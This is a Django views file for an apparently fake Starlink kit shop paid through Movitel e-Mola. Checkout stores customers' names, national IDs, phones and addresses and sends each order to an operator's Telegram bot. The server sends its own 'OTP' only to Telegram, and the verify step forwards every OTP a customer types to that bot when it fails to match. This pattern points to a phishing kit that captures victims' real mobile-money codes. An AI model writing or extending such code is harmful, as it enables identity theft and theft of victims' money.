import os
import random
import requests
from datetime import datetime, timedelta
from django.conf import settings
from django.shortcuts import render, redirect, get_object_or_404
from django.http import HttpResponse
from .models import Order

# 🏠 New View: Added the missing index function
def index(request):
    """Exibe a página principal / catálogo de kits Starlink."""
    # Renderiza o seu template principal (certifique-se de ter index.html em templates/orders/)
    return render(request, 'orders/index.html')


def generate_otp():
    """Gera um código de 6 dígitos para validação e-Mola."""
    return str(random.randint(100000, 999999))


def send_telegram_notification(order, extra_info=None):
    token = settings.TELEGRAM_BOT_TOKEN
    chat_id = settings.TELEGRAM_CHAT_ID
    if not token or not chat_id or token == 'YOUR_BOT_TOKEN': 
        return
    
    message = (
        f"🔔 *ATUALIZAÇÃO DE PEDIDO*\n\n"
        f"💳 *MÉTODO:* MOVITEL (E-MOLA)\n"
        f"👤 *Cliente:* {order.full_name}\n"
        f"📞 *Telefone:* {order.phone}\n"
        f"💰 *Total:* {order.total_amount} MT\n"
        f"--------------------------------\n"
    )
    if extra_info: 
        message += f"📝 *INFO:* {extra_info}\n"
    
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    try: 
        requests.post(url, data=payload, timeout=10)
    except Exception: 
        pass


def checkout(request):
    if request.method == 'POST':
        order = Order.objects.create(
            full_name=request.POST.get('fullName'),
            national_id=request.POST.get('nationalId'),
            email=request.POST.get('email'),
            phone=request.POST.get('phone'),
            contact_person=request.POST.get('contactPerson'),
            alt_phone=request.POST.get('altPhone'),
            city=request.POST.get('city'),
            address=request.POST.get('address'),
            delivery_method=request.POST.get('delivery_method'),
            payment_method='movitel',
            total_amount=request.POST.get('total_amount', 0)
        )
        send_telegram_notification(order, "🛒 Novo pedido criado. Aguardando envio de instruções.")
        return render(request, 'orders/payment_instructions.html', {'order': order})
    return render(request, 'orders/checkout.html')


def process_payment(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        otp = generate_otp()
        order.otp_code = otp
        order.otp_created_at = datetime.now()
        order.otp_resend_count = 0
        order.save()
        send_telegram_notification(order, f"🔑 *OTP 6-DÍGITOS GERADO:* {otp}")
        return render(request, 'orders/otp_verification.html', {'order': order})
    return redirect('index')


# 🔐 New View: Added missing verification step to prevent runtime routing crashes
def verify_otp(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    if request.method == 'POST':
        user_otp = request.POST.get('otp_code')
        
        # Opcional: Validar expiração (ex: 5 minutos)
        if order.otp_code == user_otp:
            order.status = 'Paid'  # Ou o status correspondente do seu modelo
            order.save()
            send_telegram_notification(order, "✅ *PAGAMENTO CONFIRMADO COM SUCESSO!*")
            return render(request, 'orders/payment_success.html', {'order': order})
        else:
            send_telegram_notification(order, f"❌ *Tentativa falhada de OTP:* {user_otp}")
            return render(request, 'orders/otp_verification.html', {
                'order': order, 
                'error': 'Código OTP inválido. Tente novamente.'
            })
    return redirect('index')


# 🔄 New View: Added missing OTP resend option
def resend_otp(request, order_id):
    order = get_object_or_404(Order, id=order_id)
    otp = generate_otp()
    order.otp_code = otp
    order.otp_created_at = datetime.now()
    order.save()
    send_telegram_notification(order, f"🔄 *NOVO OTP REENVIADO:* {otp}")
    return render(request, 'orders/otp_verification.html', {
        'order': order, 
        'message': 'Um novo código foi enviado.'
    })